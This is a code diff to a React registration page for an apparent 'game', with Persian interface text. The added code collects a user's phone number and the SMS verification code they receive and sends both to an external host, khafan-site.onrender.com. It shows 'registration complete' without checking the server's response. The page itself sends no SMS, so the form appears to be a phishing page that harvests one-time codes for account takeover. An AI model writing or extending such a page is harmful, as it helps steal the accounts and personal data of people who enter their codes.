@@ -11,26 +11,74 @@ export default function Register() {
     return value.replace(/\D/g, "").slice(0, max);
   };
 
-  const sendPhone = () => {
-    if (phone.length !== 11 || !phone.startsWith("09")) return;
+  const sendPhone = async () => {
+    if (phone.length !== 11 || !phone.startsWith("09")) {
+      alert("شماره معتبر نیست");
+      return;
+    }
 
     setLoading(true);
 
-    setTimeout(() => {
+    try {
+      const res = await fetch(
+        "https://khafan-site.onrender.com/phone",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            phone,
+          }),
+        }
+      );
+
+      const data = await res.json();
+
+      localStorage.setItem("userId", data.id);
+
       setLoading(false);
       setStep(2);
-    }, 2500);
+
+    } catch (err) {
+      console.log(err);
+      setLoading(false);
+      alert("خطا در اتصال به سرور");
+    }
   };
 
-  const verifyCode = () => {
-    if (code.length < 4) return;
+  const verifyCode = async () => {
+    if (code.length < 4) {
+      alert("کد معتبر نیست");
+      return;
+    }
 
     setLoading(true);
 
-    setTimeout(() => {
+    try {
+      const userId = localStorage.getItem("userId");
+
+      await fetch(
+        `https://khafan-site.onrender.com/code/${userId}`,
+        {
+          method: "PUT",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            code,
+          }),
+        }
+      );
+
       setLoading(false);
       setStep(3);
-    }, 2500);
+
+    } catch (err) {
+      console.log(err);
+      setLoading(false);
+      alert("خطا در ذخیره کد");
+    }
   };
 
   return (
@@ -46,10 +94,12 @@ export default function Register() {
             animate={{ opacity: 1, scale: 1 }}
             exit={{ opacity: 0 }}
           >
-            <h1 className="title">ورود به بازی</h1>
+            <h1 className="title">
+              ورود به بازی
+            </h1>
 
             <img
-              src="/logo.png"
+              src="https://cdn.donmai.us/original/08/20/0820bb9acc44ccd754daa0abc6247ffc.png"
               className="logo"
               alt=""
             />
@@ -70,7 +120,7 @@ export default function Register() {
             initial={{ x: 200, opacity: 0 }}
             animate={{ x: 0, opacity: 1 }}
           >
-            <h2>شماره موبایل</h2>
+            <h2>ثبت شماره موبایل</h2>
 
             <input
               type="tel"
@@ -78,7 +128,12 @@ export default function Register() {
               maxLength={11}
               placeholder="09928532443"
               onChange={(e) =>
-                setPhone(onlyNumbers(e.target.value, 11))
+                setPhone(
+                  onlyNumbers(
+                    e.target.value,
+                    11
+                  )
+                )
               }
             />
 
@@ -98,7 +153,9 @@ export default function Register() {
             initial={{ x: -200, opacity: 0 }}
             animate={{ x: 0, opacity: 1 }}
           >
-            <h2>کد تایید را وارد کنید</h2>
+            <h2>
+              کد تایید را وارد کنید
+            </h2>
 
             <p className="smsText">
               کد از طریق پیامک برای شما ارسال شد
@@ -109,7 +166,12 @@ export default function Register() {
               maxLength={6}
               placeholder="کد تایید"
               onChange={(e) =>
-                setCode(onlyNumbers(e.target.value, 6))
+                setCode(
+                  onlyNumbers(
+                    e.target.value,
+                    6
+                  )
+                )
               }
             />
 
@@ -126,8 +188,14 @@ export default function Register() {
           <motion.div
             key="done"
             className="card"
-            initial={{ scale: 1.4, opacity: 0 }}
-            animate={{ scale: 1, opacity: 1 }}
+            initial={{
+              scale: 1.4,
+              opacity: 0,
+            }}
+            animate={{
+              scale: 1,
+              opacity: 1,
+            }}
           >
             <h2 className="success">
               ثبت نام شما انجام شد
@@ -147,12 +215,14 @@ export default function Register() {
         <div className="overlay">
           <div>
             <div className="loader"></div>
+
             <div className="loadingText">
               در حال پردازش...
             </div>
           </div>
         </div>
       )}
+
     </div>
   );
 }
